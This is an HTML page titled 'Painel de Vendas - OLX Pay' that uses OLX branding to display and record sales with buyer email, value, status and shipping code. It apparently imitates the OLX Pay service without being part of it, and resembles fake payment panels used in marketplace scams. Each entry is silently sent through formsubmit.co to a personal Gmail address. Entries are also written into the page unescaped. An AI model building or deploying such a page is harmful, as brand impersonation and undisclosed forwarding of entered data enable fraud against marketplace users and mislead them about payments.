<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Painel de Vendas - OLX Pay</title>
  <link rel="icon" href="https://static.olx.com.br/static/olxbr/favicon-32x32.png" type="image/png">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      padding: 30px;
      max-width: 900px;
      margin: auto;
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 150px;
    }
    h2 {
      text-align: center;
      color: #ff6600;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 30px;
      background: #fff;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    th, td {
      padding: 15px;
      text-align: left;
      border-bottom: 1px solid #eee;
    }
    th {
      background-color: #ff6600;
      color: white;
    }
    .status {
      font-weight: bold;
    }
    .status.aprovado { color: green; }
    .status.pendente { color: orange; }
    .status.cancelado { color: red; }
    .formulario {
      margin-top: 30px;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    .formulario input, .formulario select {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
    }
    .formulario button {
      background-color: #ff6600;
      color: white;
      padding: 12px;
      border: none;
      width: 100%;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 10px;
    }
    .limpar {
      background-color: #cc0000;
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/OLX_New_Logo.svg/2560px-OLX_New_Logo.svg.png" alt="OLX Logo">
  </div>

  <h2>Painel de Vendas - OLX Pay</h2>

  <table id="tabela-vendas">
    <thead>
      <tr>
        <th>Produto</th>
        <th>Valor</th>
        <th>Comprador</th>
        <th>Status</th>
        <th>C贸digo de Postagem</th>
      </tr>
    </thead>
    <tbody>
      <!-- Vendas aparecem aqui -->
    </tbody>
  </table>

  <div class="formulario">
    <h3>Adicionar nova venda</h3>
    <input type="text" id="produto" placeholder="Nome do produto" required>
    <input type="text" id="valor" placeholder="Valor (ex: R$ 1000,00)" required>
    <input type="email" id="comprador" placeholder="Email do comprador" required>
    <select id="status">
      <option value="aprovado">Aprovado</option>
      <option value="pendente">Pendente</option>
      <option value="cancelado">Cancelado</option>
    </select>
    <input type="text" id="codigo" placeholder="C贸digo de postagem (opcional)">
    <button onclick="adicionarVenda()">Adicionar</button>
    <button onclick="limparTudo()" class="limpar">Limpar todas as vendas</button>
  </div>

  <script>
    let vendas = [];

    window.onload = function () {
      const dadosSalvos = localStorage.getItem('vendas');
      if (dadosSalvos) {
        vendas = JSON.parse(dadosSalvos);
        vendas.forEach(venda => exibirVendaNaTabela(venda));
      }
    }

    function adicionarVenda() {
      const produto = document.getElementById('produto').value.trim();
      const valor = document.getElementById('valor').value.trim();
      const comprador = document.getElementById('comprador').value.trim();
      const status = document.getElementById('status').value;
      const codigo = document.getElementById('codigo').value.trim() || '-';

      if (!produto || !valor || !comprador) {
        alert('Preencha todos os campos obrigat贸rios!');
        return;
      }

      const novaVenda = { produto, valor, comprador, status, codigo };
      vendas.push(novaVenda);
      localStorage.setItem('vendas', JSON.stringify(vendas));
      exibirVendaNaTabela(novaVenda);
      limparFormulario();

      // Enviar dados para o e-mail com campos organizados
      const dadosParaEnviar = new FormData();
      dadosParaEnviar.append('Nova venda cadastrada:', '--------------------------');
      dadosParaEnviar.append('Produto', produto);
      dadosParaEnviar.append('Valor', valor);
      dadosParaEnviar.append('Comprador (e-mail)', comprador);
      dadosParaEnviar.append('Status da Venda', status);
      dadosParaEnviar.append('C贸digo de Postagem', codigo);

      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Accept': 'application/json' },
        body: dadosParaEnviar,
      })
      .then(response => response.json())
      .then(data => {
        console.log("Email enviado:", data);
      })
      .catch(error => {
        console.error("Erro ao enviar email:", error);
      });
    }

    function exibirVendaNaTabela(venda) {
      const tbody = document.querySelector('#tabela-vendas tbody');
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${venda.produto}</td>
        <td>${venda.valor}</td>
        <td>${venda.comprador}</td>
        <td class="status ${venda.status}">${venda.status.charAt(0).toUpperCase() + venda.status.slice(1)}</td>
        <td>${venda.codigo}</td>
      `;
      tbody.appendChild(tr);
    }

    function limparFormulario() {
      document.getElementById('produto').value = '';
      document.getElementById('valor').value = '';
      document.getElementById('comprador').value = '';
      document.getElementById('status').value = 'aprovado';
      document.getElementById('codigo').value = '';
    }

    function limparTudo() {
      if (confirm("Tem certeza que deseja apagar todas as vendas?")) {
        vendas = [];
        localStorage.removeItem('vendas');
        document.querySelector('#tabela-vendas tbody').innerHTML = '';
      }
    }
  </script>

</body>
</html>
